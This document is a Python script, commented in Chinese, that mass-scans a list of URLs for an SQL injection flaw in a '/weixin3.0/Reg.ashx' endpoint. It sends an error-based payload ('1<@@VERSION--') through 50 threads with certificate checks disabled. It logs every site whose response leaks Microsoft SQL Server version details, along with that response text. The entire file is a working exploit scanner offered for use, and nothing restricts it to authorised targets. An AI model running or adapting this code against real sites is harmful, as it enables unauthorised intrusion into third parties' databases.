import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
file_lock = threading.Lock()

def check_vulnerability(url):
    try:
        target_url = urljoin(url.rstrip('/'), '/weixin3.0/Reg.ashx')

        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'close',
            'Host': url.split('//')[1].split('/')[0] if '//' in url else url.split('/')[0],
            'Content-Length': '23',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # POST数据
        data = "hum=1'and 1<@@VERSION--"
        
        #不跟随重定向
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            verify=False,
            allow_redirects=False,
            timeout=10
        )

        if 300 <= response.status_code < 400:
            print(f"[INFO] {url} - 状态码 {response.status_code} (3xx重定向)，不存在漏洞")
            return False, url, response.status_code, None
        
        elif response.status_code == 200:
            if 'Microsoft SQL Server' in response.text:
                print(f"[VULNERABLE] {url} - 存在SQL注入漏洞")
                return True, url, response.status_code, response.text
            else:
                print(f"[INFO] {url} - 状态码 200，但响应中未找到 'Microsoft SQL Server'，不存在漏洞")
                return False, url, response.status_code, None
        else:
            print(f"[INFO] {url} - 状态码 {response.status_code}，不存在漏洞")
            return False, url, response.status_code, None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return False, url, None, str(e)
    except Exception as e:
        print(f"[ERROR] {url} - 发生异常: {str(e)}")
        return False, url, None, str(e)

def write_result(vuln_info):

    is_vulnerable, url, status_code, response_text = vuln_info
    
    if is_vulnerable:
        with file_lock:
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f"=" * 60 + "\n")
                f.write(f"存在漏洞的URL: {url}\n")
                f.write(f"状态码: {status_code}\n")
                f.write(f"响应内容:\n{response_text[:1000]}\n")  # 只写入前1000个字符
                f.write(f"=" * 60 + "\n\n")

def main():

    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有有效的URL")
        return
    
    print(f"[INFO] 共读取到 {len(urls)} 个URL，开始检测...")
    print(f"[INFO] 线程数: 50")
    open('result.txt', 'w', encoding='utf-8').close()

    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result[0]:  
                    write_result(result)
            except Exception as e:
                print(f"[ERROR] {url} - 任务执行异常: {str(e)}")
    
    print(f"[INFO] 检测完成，结果已保存到result.txt")

if __name__ == "__main__":
    main()